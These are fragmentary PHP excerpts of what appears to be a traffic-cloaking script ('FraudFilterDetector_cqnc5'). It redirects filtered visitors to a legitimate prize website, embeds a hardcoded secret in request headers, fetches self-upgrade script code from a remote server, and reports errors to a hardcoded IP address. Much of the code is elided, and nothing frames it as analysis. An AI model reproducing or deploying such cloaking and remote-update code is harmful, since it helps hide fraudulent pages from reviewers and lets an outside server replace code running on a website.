...
class FraudFilterDetector_cqnc5 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'a17b8add-8d52-466a-8195-ac9f9660a87b.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.friedenspreis-des-deutschen-buchhandels.de/en/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: a17b8add-8d52-466a-8195-ac9f9660a87b',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: a17b8add-8d52-466a-8195-ac9f9660a87b';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: a17b8add-8d52-466a-8195-ac9f9660a87b';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=cqnc5&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_cqnc5 = new FraudFilterDetector_cqnc5();
$fraudFilterDetector_cqnc5->check();
